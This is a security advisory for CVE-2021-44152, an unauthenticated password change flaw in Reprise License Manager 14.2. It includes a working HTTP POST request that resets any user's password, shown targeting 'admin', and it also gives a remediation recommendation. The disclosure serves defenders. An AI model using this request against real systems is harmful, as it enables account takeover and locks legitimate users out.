    "text": "title : Reprise License Manager 14.2 Unauthenticated Password Change  ， detail : Reprise License Manager version 14.2 suffers from a missing authentication vulnerability that allows for password changing of any existing user. The vendor has contacted Packet Storm to note that version 15.1 has been released which includes a fix for this issue by requiring authentication to change a password.  ， cve : advisories | CVE-2021-44152  ，  ， desc :  # Product : Reprise License Manager 14.2  ，  # Vendor : Reprise Software  ，  # CVE ID : CVE-2021-44152  ，  # Vulnerability Title : Unauthenticated Password Change  ，  # Severity : High  ，  # Author ( s )  : Mark Staal Steenberg , Bilal El Ghoul , Gionathan Armando Reale , Andreas Fyhn Andersen , Oliver Lind Nordestgaard  ，  # Date : 2021-11-25  ，  ， Introduction :   ， Because /goform/change_password_process does not verify authentication or authorization , an unauthenticated user can change the password of any existing user. This allows an attacker to change the password of any known user , thereby preventing valid users from accessing the system and granting the attacker full access to that user's account.  ， Vulnerability :   ， If an unauthenticated user sends the following HTTP request they can change the password of any user :   ， POST /goform/change_password_process HTTP/1.1  ， Host : 127.0.0.1 : 5054  ， Content-Length : 53  ， pw1=passwd&pw2=passwd&user=admin&ok=CHANGE%2BPASSWORD  ， Recommendation :   ， Ensure that authentication is required prior to password change requests and that users cannot modify or change passwords of others users.",
